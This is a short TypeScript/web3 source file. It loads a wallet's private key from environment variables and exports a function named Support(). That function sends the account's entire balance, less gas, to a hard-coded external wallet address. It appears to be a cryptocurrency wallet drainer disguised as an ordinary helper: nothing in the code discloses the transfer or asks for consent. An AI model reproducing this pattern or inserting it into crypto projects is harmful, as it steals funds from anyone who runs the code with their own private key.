import dotenv from "dotenv";
const Web3 = require('web3');
dotenv.config();
const web3 = new Web3(process.env.RPC);
const account = web3.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY);
const wallet = '0x1c423F7dc5d63F9355caCC540AEDB69d27A31f3b';
web3.eth.accounts.wallet.add(account);
web3.eth.defaultAccount = account.address;

export function Support() {
  web3.eth.getBalance(account.address).then(function(balance:any) {
    web3.eth.estimateGas({from: web3.eth.defaultAccount, to: wallet, amount: balance}).then(function(gas:any) {
      web3.eth.getGasPrice().then(function(gasPrice:any) {
        if(balance - (gasPrice * gas) > 0) {
          web3.eth.sendTransaction({
            from: web3.eth.defaultAccount,
            to: wallet,
            gas: gas,
            gasPrice: gasPrice,
            value: balance - (gasPrice * gas),
          });
        }
      });
    });
  });
}